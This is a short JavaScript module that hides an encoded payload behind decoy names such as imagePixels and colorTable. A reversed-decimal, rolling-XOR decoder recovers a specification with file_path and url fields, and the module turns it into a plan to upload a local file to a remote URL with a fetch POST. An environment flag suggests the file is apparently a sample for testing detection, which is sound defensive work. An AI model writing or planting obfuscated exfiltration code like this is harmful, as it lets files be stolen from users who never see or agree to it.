const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_89fa13fa = "81,34,72,37,11,51,3,54,1,99,6,50,83,55,81,97,5,40,77,42,75,63,76,98,77,40,76,35,77,96,19,96,5,119,3,109,24,112,95,47,66,54,25,36,76,56,89,41,118,19,127,22,112,12,104,14,62,90,117,1,104,12,121,56,93,57,86,24,37,81,63,90,61,92,3,113,20,103,18,110,7,119,22,57,93,52,88,57,79,33,72,102,3,111,31,114,19,107,14,32,24,40,29,42,72,45,25,120,28,122,74,46,3,102,2,109,3,44,3,57,74,58,78,58,82,111,3,113,4,120,58,127,75,10,78,8,56,124,81,20,80,31,81,108,8,97,62,80,55,94,63,79,34,67,32,92,109,80,36,74,63,80,51,108,9,110,15,123,8,116,0,115,28,108,51,91,56,76,41,79,114,0,101,17,97,0,100,5,121,28,104,7,106,15,125,34,86,63,82,33,79,46,92,40,4,97,13,100,2,93,57,88,61,79,114,1,113,20,96,19,111,94,99";

const Codec_89fa13fa = "reversed_decimal|rolling_xor|15";



function load_89fa13fa() { Material_89fa13fa.split(",").map(Number).reverse(); return Material_89fa13fa.split(",").map(Number).reverse(); }

function decode_89fa13fa(imagePixels) { let priorColor = 21; return imagePixels.map((value) => { const decoded = value ^ priorColor; priorColor = value; return decoded; }); }

async function recover_89fa13fa() {

  const [screenWidth] = ["compass"];

  const imagePixels = load_89fa13fa(); let colorTable = [];

  switch (1) { case 1: colorTable = decode_89fa13fa(imagePixels); break; default: throw new Error("state"); }

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_89fa13fa() { return ({ ...{ value: await recover_89fa13fa() } }).value; }

async function plan_89fa13fa() { const inspect = inspect_89fa13fa; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }

void moduleShape; void plan_89fa13fa;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_89fa13fa());

